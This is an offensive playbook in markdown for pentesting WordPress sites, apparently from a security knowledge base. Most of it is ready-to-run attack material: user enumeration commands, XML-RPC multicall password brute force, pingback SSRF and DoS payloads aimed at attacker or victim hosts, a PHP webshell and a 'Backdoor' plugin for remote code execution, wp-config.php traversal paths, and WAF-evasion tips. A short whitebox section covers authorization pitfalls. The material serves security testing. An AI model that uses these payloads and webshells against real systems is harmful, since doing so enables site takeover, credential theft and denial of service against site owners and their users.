# WordPress

> **Summary**: WordPress is the most widely used CMS, powering over 40% of websites. Its plugin/theme ecosystem creates a large attack surface including authentication bypass, RCE via file upload, XML-RPC abuse, and REST API information disclosure.
> **Impact**: Full site compromise, database credential theft, remote code execution, user enumeration, brute force attacks.
> **Typical Severity**: Medium to Critical (depends on finding)

## Detection

### Indicators
- `/wp-login.php`, `/wp-admin/`, `/wp-content/`, `/wp-includes/` paths exist
- HTML source contains `<meta name="generator" content="WordPress X.X.X" />`
- CSS/JS files contain `?ver=X.X.X` query strings
- `xmlrpc.php` accessible at root
- `/wp-json/` REST API endpoint responds

### Automated Detection
```bash
# Version detection from source
curl -s <TARGET> | grep 'content="WordPress'

# Check license file
curl -s <TARGET>/license.txt | head -15

# Check readme
curl -s <TARGET>/readme.html | grep -i version
```

### Manual Detection
1. Browse to `/wp-login.php` -- if the WordPress login form loads, it is WordPress
2. Check `/wp-json/wp/v2/` -- REST API responds with site information
3. View page source for `/wp-content/themes/` and `/wp-content/plugins/` references

## Exploitation

### Prerequisites
- Accessible WordPress installation
- For authenticated attacks: valid credentials (any role) or admin access
- For plugin exploitation: knowledge of installed plugins/themes and their versions

### Step-by-Step

1. **Enumerate WordPress version**:
   ```bash
   curl -s <TARGET>/feed/ | grep '<generator>'
   curl -s <TARGET>/ | grep 'content="WordPress'
   curl -s <TARGET>/wp-links-opml.php | grep 'generator'
   ```
   **Success**: WordPress version identified.

2. **Enumerate users**:
   ```bash
   # Author ID brute force
   for i in $(seq 1 20); do
     curl -s -o /dev/null -w "%{http_code} - %{redirect_url}\n" "<TARGET>/?author=$i"
   done

   # REST API user enumeration
   curl -s <TARGET>/wp-json/wp/v2/users | jq '.[].slug'

   # Alternative REST route
   curl -s "<TARGET>/?rest_route=/wp/v2/users" | jq '.[].slug'
   ```
   **Success**: List of valid usernames obtained.

3. **Enumerate plugins and themes**:
   ```bash
   # Passive enumeration from page source
   curl -s <TARGET>/ | grep -oP 'wp-content/plugins/\K[^/]+' | sort -u
   curl -s <TARGET>/ | grep -oP 'wp-content/themes/\K[^/]+' | sort -u

   # Active brute force with WPScan
   wpscan --url <TARGET> --enumerate ap,at --plugins-detection aggressive
   ```
   **Success**: List of installed plugins and themes with versions.

4. **Run WPScan for comprehensive assessment**:
   ```bash
   wpscan --url <TARGET> -e vp,vt,u,cb,dbe --api-token <WPSCAN_API_TOKEN>
   ```
   **Success**: Known vulnerabilities identified in core, plugins, and themes.

5. **Exploit identified vulnerabilities** (plugin CVEs, theme vulnerabilities, etc.)

### Payloads

#### User Enumeration
```bash
# Author parameter
<TARGET>/?author=1
<TARGET>/?author=2

# REST API
<TARGET>/wp-json/wp/v2/users
<TARGET>/wp-json/wp/v2/users?per_page=100

# AJAX user search (authenticated)
<TARGET>/wp-admin/admin-ajax.php?action=query-attachments&query[s]=test

# wp-json with route parameter (when pretty permalinks disabled)
<TARGET>/?rest_route=/wp/v2/users
```

#### XML-RPC Abuse

**Check if XML-RPC is enabled:**
```bash
curl -s -X POST <TARGET>/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
```

**Brute force via XML-RPC (bypasses login rate limiting):**
```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string><USERNAME></string></value></param>
    <param><value><string><PASSWORD></string></value></param>
  </params>
</methodCall>
```

**Multicall brute force (multiple passwords in one request):**
```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param><value><array><data>
      <value><struct>
        <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
        <member><name>params</name><value><array><data>
          <value><string><USERNAME></string></value>
          <value><string><PASSWORD_1></string></value>
        </data></array></value></member>
      </struct></value>
      <value><struct>
        <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
        <member><name>params</name><value><array><data>
          <value><string><USERNAME></string></value>
          <value><string><PASSWORD_2></string></value>
        </data></array></value></member>
      </struct></value>
    </data></array></value></param>
  </params>
</methodCall>
```

**SSRF via XML-RPC pingback:**
```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://<ATTACKER_OR_INTERNAL_IP></string></value></param>
    <param><value><string><TARGET>/any-post</string></value></param>
  </params>
</methodCall>
```

**DoS via XML-RPC pingback amplification:**
```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://<VICTIM_IP></string></value></param>
    <param><value><string><TARGET>/any-post</string></value></param>
  </params>
</methodCall>
```

#### Admin Panel to RCE

**Theme Editor (Appearance > Theme Editor):**
1. Navigate to Appearance > Theme Editor
2. Select a PHP file (e.g., `404.php` from the active theme)
3. Insert PHP webshell: `<?php system($_GET['cmd']); ?>`
4. Access: `<TARGET>/wp-content/themes/<THEME_NAME>/404.php?cmd=id`

**Plugin Upload:**
1. Create a malicious plugin:
   ```php
   <?php
   /**
    * Plugin Name: Backdoor
    * Version: 1.0
    */
   system($_GET['cmd']);
   ?>
   ```
2. Zip it: `zip backdoor.zip backdoor.php`
3. Upload via Plugins > Add New > Upload Plugin
4. Activate the plugin
5. Access: `<TARGET>/wp-content/plugins/backdoor/backdoor.php?cmd=id`

#### wp-config.php Exposure

```bash
# Common exposure paths
<TARGET>/wp-config.php
<TARGET>/wp-config.php.bak
<TARGET>/wp-config.php.old
<TARGET>/wp-config.php.save
<TARGET>/wp-config.php.swp
<TARGET>/wp-config.php~
<TARGET>/.wp-config.php.swp

# Via LFI
<TARGET>/wp-content/plugins/<VULN_PLUGIN>/?file=../../../wp-config.php

# Via directory traversal in theme
<TARGET>/wp-content/themes/<THEME>/download.php?file=../../../wp-config.php
```

### Proof of Concept

```bash
# Full WPScan assessment
wpscan --url <TARGET> \
  --enumerate vp,vt,u,cb,dbe \
  --api-token <API_TOKEN> \
  --plugins-detection aggressive \
  --random-user-agent

# Brute force with WPScan
wpscan --url <TARGET> \
  --usernames admin \
  --passwords /usr/share/wordlists/rockyou.txt \
  --max-threads 50

# XML-RPC brute force
wpscan --url <TARGET> \
  --usernames admin \
  --passwords /usr/share/wordlists/rockyou.txt \
  --password-attack xmlrpc-multicall
```

## Code Analysis (Whitebox)

### Key WordPress Configuration

When doing dynamic testing for XSS, check if this is set in `wp-config.php`:
```php
define( 'DISALLOW_UNFILTERED_HTML', true );
```
This prevents admin/editor users from embedding JavaScript/HTML.

### Ajax Actions

Ajax actions are called via `/wp-admin/admin-ajax.php`:
```php
add_action( 'wp_ajax_fcn_name', 'callback_function' );        // Logged-in users
add_action( 'wp_ajax_nopriv_fcn_name', 'callback_function' );  // Unauthenticated
```

Call with:
```
POST /wp-admin/admin-ajax.php
Content-Type: application/x-www-form-urlencoded

action=fcn_name
```

### REST Route Registration

```php
register_rest_route('namespace/v1', '/route', array(
    'methods' => 'GET',
    'callback' => 'handler_function',
    'permission_callback' => 'permission_function',
));
```

**Red flag**: If `permission_callback` is set to `__return_true`, there is no authentication check.

### Default REST Routes
```
/wp-json/wp/v2/users/
/wp-json/wp/v2/comments/
/wp-json/wp/v2/pages/
/wp-json/wp/v2/posts/
/index.php?rest_route=<CUSTOM_REST_ROUTE>
```

Generate nonce for REST calls:
```
POST /wp-admin/admin-ajax.php?action=rest-nonce
```

### Shortcodes

```php
add_shortcode( 'shortcode_name', 'callback_func' );
```
Usage in posts: `[shortcode_name param_one="value"]`

### Dangerous WordPress Functions

- **`is_admin()`**: Does NOT check if the user is an administrator. It checks if the request is to an admin page. Do not use for authorization.
- **`is_user_admin()`**: Same as above -- checks admin interface, not admin role.
- **`current_user_can('administrator')`**: Correct way to check admin role.

## Bypasses

- If `/wp-login.php` is protected, try `/wp-admin/admin-ajax.php` for authentication
- If XML-RPC is partially blocked, try individual methods instead of `system.multicall`
- If user enumeration via `?author=` is blocked, try the REST API or AJAX endpoints
- If WPScan is blocked by WAF, use `--random-user-agent` and `--throttle` flags
- If the theme editor is disabled, try plugin upload or direct file write via plugin vulnerabilities
- [Check WordPress IP behind WAF](https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip)

## Escalation

- **Credentials in wp-config.php**: Database credentials for direct DB access
- **Admin access to RCE**: Theme editor or plugin upload for webshell
- **Plugin vulnerabilities to SQLi/RCE**: Exploit known CVEs in installed plugins
- **Database access to credential dump**: Extract user hashes from `wp_users` table
- **SSRF via XML-RPC**: Access internal services or cloud metadata

## Tools

| Tool | Usage |
|------|-------|
| WPScan | `wpscan --url <TARGET> -e vp,vt,u` -- comprehensive WordPress scanner |
| WPScan API | Register for API token to get vulnerability data |
| WPSechelper | [GitHub](https://github.com/felipecaon/wpsechelper/) -- WordPress security helper |
| Nuclei | `nuclei -u <TARGET> -tags wordpress` -- template-based scanning |
| xmlrpc-bruteforcer | Python script for XML-RPC multicall brute force |
| wp-cli | WordPress command-line interface for local testing |

## References

- [WPScan](https://github.com/wpscanteam/wpscan)
- [WordPress Coding Standards](https://github.com/WordPress/WordPress-Coding-Standards)
- [WordPress REST API Reference](https://developer.wordpress.org/rest-api/reference)
- [WordPress is_admin() Documentation](https://developer.wordpress.org/reference/functions/is_admin/)
- [HackTricks - WordPress](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)

## Cross-References

- [File Upload](../vulns/file-upload.md) -- Plugin/theme upload for RCE
- [SQL Injection](../vulns/sqli.md) -- SQLi via vulnerable plugins
- [XSS](../vulns/xss.md) -- Stored XSS in posts, comments, or plugin fields
- [SSRF](../vulns/ssrf.md) -- XML-RPC pingback SSRF
